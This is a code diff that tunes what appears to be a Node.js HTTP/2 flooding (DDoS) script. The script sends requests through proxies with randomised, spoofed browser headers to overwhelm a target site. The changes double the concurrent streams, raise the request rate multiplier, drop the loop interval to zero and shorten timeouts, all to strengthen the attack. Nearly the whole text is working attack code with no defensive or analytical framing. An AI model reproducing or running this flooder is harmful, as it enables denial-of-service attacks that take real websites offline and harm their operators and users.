@@ -82,6 +82,7 @@ const accept_header = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "application/xml,application/json,text/html;q=0.9, */*;q=0.1"
 ];
+
 const lang_header = [
     "en-US,en;q=0.9",
     "vi-VN,vi;q=0.9,en-US;q=0.8",
@@ -91,23 +92,27 @@ const lang_header = [
     "de-DE,de;q=0.9,en;q=0.8",
     "ja-JP,ja;q=0.9,en;q=0.8"
 ];
+
 const encoding_header = [
     "gzip, deflate, br, zstd",
     "gzip, deflate",
     "br, zstd",
     "compress, gzip"
 ];
+
 const sec_fetch_headers = {
     "sec-fetch-dest": ["document", "script", "image", "font", "style", "empty"],
     "sec-fetch-mode": ["navigate", "cors", "no-cors", "same-origin", "websocket"],
     "sec-fetch-site": ["same-origin", "same-site", "cross-site", "none"]
 };
+
 const cache_control = [
     "no-cache",
     "max-age=0",
     "no-store",
     "must-revalidate"
 ];
+
 const referers = [
     `https://${parsedTarget.host}/`,
     `https://${parsedTarget.host}${parsedTarget.path}`,
@@ -118,6 +123,7 @@ const referers = [
     "https://duckduckgo.com/",
     ""
 ];
+
 const platforms = [
     "Windows",
     "Macintosh",
@@ -127,6 +133,7 @@ const platforms = [
     "iPad",
     "X11"
 ];
+
 const sec_ch_ua = [
     '"Google Chrome";v="129", "Chromium";v="129", "Not.A/Brand";v="99"',
     '"Firefox";v="131"',
@@ -136,6 +143,7 @@ const sec_ch_ua = [
     '"Firefox";v="130"',
     '"Safari";v="19.0"'
 ];
+
 const sec_ch_ua_full_version = [
     '"129.0.6668.100"',
     '"131.0.0.0"',
@@ -271,7 +279,7 @@ async function checkProxy(proxyAddr) {
             host,
             port: parseInt(port),
             address: parsedTarget.host + ":443",
-            timeout: 2
+            timeout: 1
         });
         connection.destroy();
         return true;
@@ -292,14 +300,14 @@ async function runFlooder() {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
         address: parsedTarget.host + ":443",
-        timeout: 10
+        timeout: 5
     };
 
     try {
         const connection = await Socker.HTTP(proxyOptions);
         const tlsOptions = {
             secure: true,
-            ALPNProtocols: ['h2', 'http/1.1'],
+            ALPNProtocols: ['h2'],
             ciphers: ciphers,
             host: parsedTarget.host,
             servername: parsedTarget.host,
@@ -312,13 +320,13 @@ async function runFlooder() {
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
-        tlsConn.setKeepAlive(true, 120000);
+        tlsConn.setKeepAlive(true, 60000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 500,
+                maxConcurrentStreams: 1000,
                 initialWindowSize: 10485760,
                 maxHeaderListSize: 524288,
                 enablePush: false
@@ -329,10 +337,10 @@ async function runFlooder() {
         client.on("connect", () => {
             const intervalAttack = setInterval(async () => {
                 const dynHeaders = generateDynamicHeaders();
-                for (let i = 0; i < args.rate * 2; i++) {
-                    const request = client.request(dynHeaders, { timeout: 300 });
+                for (let i = 0; i < args.rate * 3; i++) {
+                    const request = client.request(dynHeaders, { timeout: 200 });
                     if (dynHeaders[":method"] === "POST") {
-                        request.write(JSON.stringify({ data: randstr(20) }));
+                        request.write(Buffer.alloc(randomIntn(10, 50)));
                     }
                     request.on("response", () => {
                         request.close(http2.constants.NGHTTP2_NO_ERROR);
@@ -342,8 +350,8 @@ async function runFlooder() {
                     });
                     request.end();
                 }
-                await new Promise(r => setTimeout(r, randomIntn(10, 50)));
-            }, 1);
+                await new Promise(r => setTimeout(r, randomIntn(5, 20)));
+            }, 0);
 
             setTimeout(() => {
                 clearInterval(intervalAttack);
@@ -365,6 +373,6 @@ async function runFlooder() {
             connection.destroy();
         });
     } catch (error) {
-        setTimeout(runFlooder, 500);
+        setTimeout(runFlooder, 200);
     }
 }
